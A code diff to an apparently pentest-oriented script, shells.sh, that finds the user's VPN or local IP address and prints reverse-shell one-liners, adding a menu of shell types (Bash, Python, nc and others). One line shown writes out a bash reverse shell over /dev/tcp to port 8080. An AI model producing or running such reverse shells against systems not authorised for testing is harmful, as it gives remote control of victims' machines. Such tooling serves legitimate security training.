@@ -4,17 +4,23 @@
 
 #/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1 > "$new"
 #echo $new
+error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available
 
-if [ "$2" == "-v" ]
+ 
+if [ "$2" == "-v" ] || [ "$2" == "" ]
 then
-	error=$(cat /sys/class/net/tun0/operstate 2>/dev/null) # 2>/dev/null is used to suppress the error msg from cat if tun0 is not available
 	# echo $error
 	if [ "$error" == "unknown" ]
 	then
 	ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
 	else
+		if [ "$2" == "" ]
+		then
+			ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
+		else
 		echo "You are not connected to any virtual network"
 		exit
+		fi
 	fi
 elif [ "$2" == "-l" ] 
 then
@@ -80,6 +86,10 @@ fi
 #   esac
 # done
 
+options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm'
+help='Usage: ./shells.sh [shell type] -[flag] \n -h \t\t\t\t show help \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -o \t\t\t\t show options/shells'
+
+
 #######
 echo $ip4
 
@@ -88,11 +98,12 @@ if [ "$1" != "" ]
 then
 	if [ "$1" == "-h" ]
 	then
-	echo "Usage: ./shells.sh [type] -[flag]
+	echo -e "$options"
+	echo -e "$help"
+	elif [ "$1" == "-o" ]
+	then
+		echo -e "$options"
 
-	-h                		  show help
-	-v 				  use virtual ip address
-	-l 				  use local ip address"
 	elif [ $1 == "bash" ]
 	then
 		echo "bash -i >& /dev/tcp/$ip4/8080 0>&1"
